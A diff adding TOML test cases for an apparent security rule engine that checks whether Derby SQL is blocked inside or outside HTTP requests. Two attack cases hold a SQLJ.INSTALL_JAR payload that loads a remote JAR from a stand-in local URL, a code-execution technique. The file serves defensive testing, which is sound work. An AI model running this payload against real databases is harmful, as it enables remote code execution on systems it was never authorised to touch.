@@ -1,0 +1,48 @@
+[[case]]
+name = "derby-install-jar-outside-request"
+kind = "attack"
+via = "sink"
+op = "sql.execute"
+args = { sql = "CALL SQLJ.INSTALL_JAR('http://127.0.0.1:1/x.jar', 'APP.EXPLOIT', 0)" }
+
+[case.primary]
+effect = "none"
+why = "the primary decides Derby SQL only inside an HTTP request"
+
+[case.backport]
+effect = "unreachable"
+why = "the backports have no Derby SQL rule; they check Derby code loading in the JDBC URL"
+
+[[case]]
+name = "derby-install-jar-in-request"
+kind = "attack"
+via = "request-sink"
+op = "sql.execute"
+args = { sql = "CALL SQLJ.INSTALL_JAR('http://127.0.0.1:1/x.jar', 'APP.EXPLOIT', 0)" }
+
+[case.request]
+method = "GET"
+uri = "/app/report"
+query = "id=7"
+headers = { User-Agent = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0", Accept = "text/html" }
+
+[case.primary]
+effect = "block"
+rule = "sql_derby_code_execution"
+
+[case.backport]
+effect = "unreachable"
+why = "the backports have no Derby SQL rule; they check Derby code loading in the JDBC URL"
+
+[[case]]
+name = "benign-compress-table"
+kind = "benign"
+via = "sink"
+op = "sql.execute"
+args = { sql = "CALL SYSCS_UTIL.SYSCS_COMPRESS_TABLE('APP', 'REPORTS', 0)" }
+
+[case.primary]
+effect = "none"
+
+[case.backport]
+effect = "none"
